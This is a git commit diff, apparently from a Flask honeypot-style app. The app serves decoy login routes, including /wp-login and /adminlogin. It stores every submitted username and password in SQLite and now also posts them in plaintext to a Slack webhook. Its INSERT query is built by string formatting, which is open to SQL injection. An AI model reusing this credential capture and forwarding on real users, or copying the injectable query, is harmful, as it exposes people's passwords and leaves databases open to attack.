69fcd510090bfa728083f6c17d80dc251ce5e3d7
Ben Bornholm <bbornholm2194@Bens-MacBook-Pro.local>
2017-11-20 04:54:59 -0500

    Slack messages working

--- app/__init__.py
+++ app/__init__.py
@@ -6,6 +6,7 @@ db = sqlite3.connect('database.sql')
 cursor = db.cursor()
 cursor.execute('''CREATE TABLE IF NOT EXISTS creds(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, dt TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
 
+
 # Init flask app
 app = Flask(__name__)
 
--- app/main.py
+++ app/main.py
@@ -5,11 +5,28 @@ Description: Default web server
 """
 from app import app, cursor, db
 from flask import Flask, render_template, request, url_for
+from config import slack_webhook
 import sqlite3
 
 """
 Slack messager
 """
+def slack_message(text):
+    from urllib2 import Request, urlopen
+    #from urlparse import urlparse
+    #from urllib.request import urlopen, Request
+    #from urllib import parse
+    import json
+
+    post = {"text": "{0}".format(text)}
+
+    try:
+        json_data = json.dumps(post)
+        req = Request(slack_webhook, data=json_data.encode('ascii'), headers={'Content-Type': 'application/json'})
+        resp = urlopen(req)
+    except Exception as em:
+        print("EXCEPTION: " + str(em))
+
 
 """
 Store usernames and passwords to database
@@ -18,17 +35,19 @@ def add_entry(username, password):
     cursor.execute('''INSERT INTO creds (username, password) VALUES ('{0}','{1}')'''.format(username, password))
     db.commit()
 
+
 """
 Default route and routes to login page
 """
 @app.route('/', methods=['GET', 'POST'])
 @app.route('/login', methods=['GET', 'POST'])
 @app.route('/admin/login', methods=['GET', 'POST'])
+@app.route('/wp-login', methods=['GET', 'POST'])
+@app.route('/adminlogin', methods=['GET', 'POST'])
 def login():
     error = 'Invalid Credentials. Please try again.'
     if request.method == 'POST':
         add_entry(request.form['username'], request.form['password'])
-        print request.form['username']
-        print request.form['password']
+        slack_message("Web login with username: {0} and password: {1}".format(request.form['username'], request.form['password']))
 
     return render_template('login.html', error=error)
